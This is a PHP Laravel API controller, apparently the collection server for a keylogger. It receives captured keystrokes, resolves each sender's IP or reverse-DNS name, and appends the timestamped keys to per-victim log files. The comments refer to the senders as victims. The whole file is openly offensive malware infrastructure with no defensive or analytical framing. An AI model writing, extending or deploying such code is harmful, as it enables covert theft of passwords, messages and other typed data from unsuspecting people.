<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Illuminate\Contracts\Filesystem\FileNotFoundException;
use Illuminate\Http\Request;
use Storage;

class KeyLoggerController extends Controller
{
    public function LogStroke(Request $request)
    {
        $data = $request->validate([
            'keys' => 'required|string|min:1',
        ]);

        // Obtain the logged ip's dns record, if one exists
        $client = gethostbyaddr($request->ip());

        // Pull the required keys
        $keys = $data['keys'];

        // If we were unable to find a valid dns entry, go ahead and store it in a file named by the IP address
        if ($client == $request->ip()) {
            $path = implode(DIRECTORY_SEPARATOR, ['ip', "{$client}.log"]);

            // Create a unique folder for the victim
            Storage::disk()->append($path, '', '');
        } // A dns entry was found, go ahead and store it as a file named by the dns entry
        else {
            $path = implode(DIRECTORY_SEPARATOR, [
                'dns', implode(DIRECTORY_SEPARATOR, array_reverse(explode(".", $client))) . '.log'
            ]);

            // Create a unique folder structure for the victim
            Storage::disk()->append($path, '', '');
        }

        // Place the key logged information with a timestamp, new line on every minute
        try {
            if (Storage::disk()->get($path) != null) {
                Storage::disk()->append($path, "\n", '');
            }
        } catch (FileNotFoundException $exception) {
            // Ignore
        }

        Storage::disk()->append($path, '[' . Carbon::now()->isoFormat('MMMM Do YYYY, h:mm:ss a') . '] ', '');
        Storage::disk()->append($path, $keys, '');

        return response()->json([
            'status' => 'success',
        ]);
    }
}
